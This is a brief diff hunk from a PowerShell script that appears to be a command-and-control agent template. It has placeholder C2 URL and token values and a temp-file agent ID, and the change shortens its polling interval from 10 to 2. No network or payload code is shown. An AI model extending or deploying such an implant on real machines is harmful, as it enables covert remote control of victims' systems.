@@ -1,7 +1,7 @@
 $C2Url = "__C2_URL__"
 $C2Token = "__C2_TOKEN__"
 $AidFile = "$env:TEMP\.agent_id"
-$Interval = 10
+$Interval = 2
 
 function Get-AgentId {
     if (Test-Path $AidFile) {
